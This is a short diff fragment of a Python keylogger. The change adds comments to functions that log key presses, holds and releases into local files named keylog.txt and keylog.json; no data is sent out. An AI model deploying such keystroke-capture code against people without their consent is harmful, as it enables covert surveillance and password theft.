@@ -5,16 +5,16 @@ keylist= []
 x = False
 key_strokes = ""
 
-def update_text_file(key):
+def update_text_file(key):          #function to update the text file
     with open("keylog.txt", "w+") as key_stroke:
         key_stroke.write(key)
 
-def update_json_file(keylist):
+def update_json_file(keylist):   #function to update the json file
     with open("keylog.json", "wb") as key_log:
         key_list_bytes = json.dumps(keylist).encode()
         key_log.write(key_list_bytes)
 
-def on_press(key):
+def on_press(key):       #function to log key press
     global x , keylist
     if x == False:
         keylist.append({'pressed' : f'{key}'})
@@ -23,7 +23,7 @@ def on_press(key):
         keylist.append({'Held' : f'{key}'})
     update_json_file(keylist)
 
-def on_release(key):
+def on_release(key):         #function to log key release
     global x , keylist , key_strokes 
     keylist.append({'Released' : f'{key}'})
     if x == True:
